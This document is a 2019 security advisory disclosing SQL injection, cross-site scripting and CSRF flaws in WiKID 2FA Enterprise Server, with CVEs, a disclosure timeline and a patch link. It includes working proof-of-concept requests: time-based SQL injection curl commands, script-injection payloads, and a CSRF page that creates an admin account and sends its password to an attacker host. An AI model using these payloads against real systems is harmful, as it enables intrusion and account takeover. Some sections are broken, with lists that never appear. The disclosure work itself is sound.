# WiKID 2FA Enterprise Server Multiple Issues

---

*From*: Aaron Bishop <aaron () securitymetrics com>

*Date*: Wed, 16 Oct 2019 17:52:27 -0600

---

```
WiKID Systems 2FA Enterprise Serverversion 4.2.0-b2032 and earlier was
found to be vulnerable to multiple Cross-Site Scripting, SQLi, and CSRF
issues.

*searchDevices.jsp* is vulnerable to SQL injection through the *uid* and
*domain* parameters.  The application uses Postgres which supports Stacked
Queries, the issue can be seen by submitting a request like:

SLEEP=10; HOST=$RHOST; COOKIE=$COOKIE; time curl -v -i -s -k  -X
'POST' -H "Host: $HOST" -H "Cookie: JSESSIONID=$COOKIE;" --data-binary
"uid=test&domain=1;select pg_sleep($SLEEP);--&action=Search"
<https://$HOST/WiKIDAdmin/searchDevices.jsp>

The request will cause the database to sleep for 10+ seconds.  This issue
has been assigned *CVE-2019-16917*.

*processPref.jsp* is vulnerable to SQL injection through the *key* parameter
if the action parameter is set to *update.*  The following request will
trigger the issue for an authenticated user:

<https://$RHOST/WiKIDAdmin/processPref.jsp?action=Update&key=test%27;%20SELECT%20pg_sleep>(5);--

The request will cause the database to sleep for 5+ seconds.  This issue
has been assigned *CVE-2019-17117.*

*Logs.jsp* is vulnerable to SQL injection through the *substring *and
*source* parameters.  The following request will demonstrate the issue:

time curl --output /dev/null -s -k -H "Cookie: JSESSIONID=$COOKIE"
--data-binary "source='; select pg_sleep(5);--"
<https://$RHOST/WiKIDAdmin/Log.jsp>

real    0m10.572s
user    0m0.008s
sys     0m0.016s

The request will cause the database to sleep for 5+ seconds.  This issue
has been assigned *CVE-2019-17119*

*usrPreregistration.jsp *is vulnerable to cross site scripting by uploading
a malicious .csv file containing <script> elements. This issue has been
assigned *CVE-2019-17114*

*Logs.jsp *is vulnerable to cross site scripting by triggering errors in
the unauthenticated portion of the application. The errors are severe
enough to appear in the logs by default.  This issue has been assigned
*CVE-2019-17115.*

*groups.jsp *is vulnerable to cross site scripting by creating a group with
a name that contains <script> elements. This issue has been assigned
*CVE-2019-17116*

*adm_usrs.jsp *is vulnerable to cross site scripting when an admin is
created with a username containing <script> elements. This issue has been
assigned *CVE-2019-17120*

The application does not implement CSRF protection.  Tricking an
authenticated user to click a link like:

<a href="<https://$RHOST/WiKIDAdmin/adm_usrs.jsp?usr=pentest&newpass1=password1&newpass2=password1&action=Add">;>WiKIDAdmin
Manual</a>

Will result in an admin user unintentionally being created. This issue has
been assigned *CVE-2019-17118*

WiKID 2FA Enterprise Server Cross-Site Scripting

# WiKID 2FA Enterprise Server Cross-Site Scripting

**Author:** Aaron Bishop

## CVE-2019-17114

A stored and reflected cross-site scripting vulnerability, CVE-2019-17114, was identified on `WiKID Systems 2FA Enterprise Server` version `4.2.0-b2047` and earlier. The preRegistrationData parameter, used on **userPreregistration.jsp**, reflects malicious HTML elements contained in an uploaded `.csv`. The contents of the file are stored and the malicious HTML elements rendered whenever `List Pre-Registration` is used.

## Patch

* **4.2.0.b2053**: <https://downloads.wikidsystems.com/wikid-server-enterprise-4.2.0.b2053-1.noarch.rpm>

## Timeline

* 26 Sep 2019 - Issue discovered on `WiKID Systems 2FA Enterprise Server 4.2.0-b2032`
* 29 Sep 2019 - Issue disclosed to WiKID Systems
* 09 Oct 2019 - Issue confirmed by WiKID Systems, Patch released
* 16 Oct 2019 - Public Disclosure

## Description

The source for **userPreregistration.jsp** shows values for  `pre_registration_code` and `name` columns in database being retrieved and added to a string being constructed:

```
272                         sb.append("</font></td><td style=\"padding: 5px;\"><font face=\"courier\" size=\"-1\">")
273                         .append(rs.getString("pre_registration_code"))
274                         .append("</font></td><td style=\"padding: 5px;\"><font face=\"courier\" size=\"-1\">")
275                         .append(URLDecoder.decode(rs.getString("name"),"UTF-8"))
276                         .append("</font></td></tr>");
```

The constructed string is then included in the HTML of the page.  The values retrieved from the database are not validated or sanitized, consequently, creating a file containing malicious entries such as:

```
<script>alert(1)</script>,<script>alert(2)</script>
```

![](https://ix-cdn.b2e5.com/images/32040/32040_10417de98b91400f814b2a18b1259105_1571258803.png)

![](https://ix-cdn.b2e5.com/images/32040/32040_f7f7d06ff3d64df8ae008b18b2bf7ed4_1571258863.png)

The malicious **name** and **pre\_registration\_code** are stored and will trigger whenever `userPreregistration.jsp?prAction=List+Pre-Registration+Data` is visited:

![](https://ix-cdn.b2e5.com/images/32040/32040_da8307fd93374a5689f865952dbc9b1e_1571258951.png)

The malicious *<script>* elements are visible in the page source:

```
    <tr><td colspan="2"><h2>Current Pre-Registration Data</h2></td></tr>
          <tr><td><b>UserID</b></td><td><b>Registration Code</b></td><td><b>Domain</b></td></tr>
          <tr  style="padding: 5px;"><td style="padding: 5px;"><font face="courier" size="-1"><script>alert(2)</script> (unregistered)</font>
```

## **CVE-2019-17115**

An unauthenticated stored cross-site scripting vulnerability, CVE-2019-17115, was identified on `WiKID Systems 2FA Enterprise Server` version `4.2.0-b2047` and earlier. Submitting invalid values, through one of the affected parameters, will cause an error to be logged and stored as a `rendered_message`; the malicious value is retrieved and displayed through **Logs.jsp**. The error messages are severe enough to be displayed by default.

## Patch

* **4.2.0.b2053**: <https://downloads.wikidsystems.com/wikid-server-enterprise-4.2.0.b2053-1.noarch.rpm>

## Timeline

* 26 Sep 2019 - Issue discovered on `WiKID Systems 2FA Enterprise Server 4.2.0-b2032`
* 29 Sep 2019 - Issue disclosed to WiKID Systems
* 09 Oct 2019 - Issue confirmed by WiKID Systems, Patch released
* 16 Oct 2019 - Public Disclosure

## Description

The source for **Logs.jsp** reveals values from the `rendered_message` column are included, unsanitized, in a string which is constructed and included in the HTML for **Logs.jsp**

```

`wikid-server-enterprise-lib-4.2.0.jar` reveals several instance where parameters are read and passed to the logger. One example can be found in `com.wikidsystems.server.InitDevice5AES`:

```
70      try {
71        requestAction = Integer.parseInt(request.getParameter("a"));
72        logger.debug("Determined requested action: " + requestAction);
73      }
74      catch (NumberFormatException nfe) {
75        nfe.printStackTrace();
76        logger.error("IO error during registration -- recieved action: " + request.getParameter("a"), nfe);
77      }
```

A non-integer value for **a** will trigger an error and drop into the `catch` block; the **a** parameter is then included,  in the message passed to `logger`, with the severity of **error**.

The following request submits an HTML *<script>* element as the value for **a**:

```
POST /wikid/servlet/com.wikidsystems.server.InitDevice5AES HTTP/1.1
Host: $RHOST
User-Agent: WiKID J2ME Token
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Content-Type: application/x-www-form-urlencoded
Content-Length: 60

S=1&a=test'><script>alert('InitDevice5AES - A')</script><!--
```

The JavaScript is executed whenever `Log.jsp` is visited:

The malicious *<script>* is visible in source of the page:

```
<a href="./Log.jsp?subString=IO error during registration phase 1 -- recieved action: test"><script>alert('InitDevice5AES - A')</script><!--'><img src='./images/toolFilter.png' alt=''
```

The following parameters and endpoints are known to be vulnerable and do not require authentication:

```

The application did not implement a method of CSRF prevention, consequently, all state changing requests were potentially vulnerable, a sample of affected requests include:

* adm\_usrs.jsp?action=add
* adm\_usrs.jsp?action=Delete
* processDeviceStatus.jsp? action=Update
* processDeviceStatus.jsp? action=Disable
* processDeviceStatus.jsp? action=Enable
* processDeviceStatus.jsp? action=Delete
* groups.jsp?groupAction=Add
* groups.jsp?groupAction=Delete

## Patch

* **4.2.0.b2053**: <https://downloads.wikidsystems.com/wikid-server-enterprise-4.2.0.b2053-1.noarch.rpm>

## Timeline

* 26 Sep 2019 - Issue discovered on `WiKID Systems 2FA Enterprise Server 4.2.0-b2032`
* 29 Sep 2019 - Issue disclosed to WiKID Systems
* 09 Oct 2019 - Issue confirmed by WiKID Systems, Patch released
* 16 Oct 2019 - Public Disclosure

## Description

Walking through the application revealed that requests did not contain a method of CSRF protection. For example, the request to create an admin user is:

```
GET /WiKIDAdmin/adm_usrs.jsp?usr=test&newpass1=password1&newpass2=password1&action=Add HTTP/1.1
Host: $RHOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=$COOKIE
Connection: close
Upgrade-Insecure-Requests: 1
```

The request is not verified as an action intentionally performed by a legitimate  user.

This request could be hidden in a link on a page:

```
<a href="https://$RHOST/WiKIDAdmin/adm_usrs.jsp?usr=pentest&newpass1=password1&newpass2=password1&action=Add">WiKIDAdmin Manual</a>
```

Or in JavaScript that will execute silently in the background:

```
<html>
    <body>
        <script>
function notify(randomstring)
{
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://$LHOST?pass=" + randomstring, true);
    xhr.send();
}

function addUser()
{
    var randomstring = Math.random().toString(36).slice(-12);
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://$RHOST/WiKIDAdmin/adm_usrs.jsp?usr=pentest&newpass1="+randomstring+"&newpass2="+randomstring+"&action=Add", true);
    xhr.withCredentials = true;
    xhr.send();
    notify(randomstring);
}
addUser();
        </script>
    </body>
</html>
```

If a user, that is authenticated to the WiKID 2FA Enterprise server application, visits the malicious page, a new admin will be created.

The following demonstrates a user visiting the malicious page, `csrf.html`, followed by unintentional, background requests to create an admin and send the attacker the password for the new account:

```
$RHOST - - [14/Oct/2019 04:44:17] "GET /?pass=0.xhd2htmjz1 HTTP/1.1" 200 -
